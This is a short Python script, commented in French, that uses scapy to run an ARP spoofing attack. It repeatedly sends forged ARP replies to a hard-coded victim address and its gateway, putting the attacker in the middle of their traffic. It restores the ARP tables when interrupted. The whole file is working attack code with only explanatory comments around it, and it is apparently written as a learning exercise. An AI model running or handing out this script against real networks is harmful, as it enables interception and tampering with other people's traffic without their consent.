#!/usr/bin/python3

import scapy.all as scapy
import time

# FUN1 pour obtenir l'adresse MAC à partir de l'adresse IP
def get_mac(target_ip):
    arp_req = scapy.ARP(pdst = target_ip) # on fait une requête ARP qui demande l'adresse MAC de l'ip cible
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # Ether() permet de spécifier l'adresse MAC de destination (ici broadcast = tout le monde)
    answer_list = scapy.srp(broadcast/arp_req, timeout=1, verbose=False)[0] # SendAndReceivePacket() 
    return answer_list[0][1].hwsrc # config reponse


# FUNC2 envoie un paquet ARP à la victime et donc se fait passer pour l'usurpé(souvent un routeur).
def spoof(victim_ip, spoof_ip):
    # victime ip est l'ip de la victime et spoof_ip est celle de l'usurpé.
    target_mac =  get_mac(victim_ip)
    packet = scapy.ARP(op = 2, pdst = victim_ip, hwdst = target_mac, psrc = spoof_ip)     # op = 1 = requête par défaut, op = 2 = réponse
    # on crée un paquet ARP qui part de l'ip de l'usurpé vers la victime.
    scapy.send(packet, verbose = False) # envoi

# FUNC3 Restauration de la table ARP
def restore(target_ip, real_ip):
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc= real_ip, hwsrc = real_mac)
    scapy.send(packet, verbose = False)

victim_ip = "192.168.68.112"
gateway = "192.168.68.1"

# MAIN
packets_count = 0
try:
    while True:
        spoof(victim_ip, gateway) 
        spoof(gateway, victim_ip)
        packets_count += 2
        print("\r[+] Packets sent: " + str(packets_count), end="") # end="" permet de ne pas aller à la ligne
        time.sleep(2) # 2s avant d'envoyer les paquets pour pas saturer le réseau.
except KeyboardInterrupt:
    print("\n[+] Table ARP en cours de restauration...")
    restore(victim_ip, gateway)
    restore(gateway, victim_ip)
    print("[+] Table ARP restaurée avec succès.")

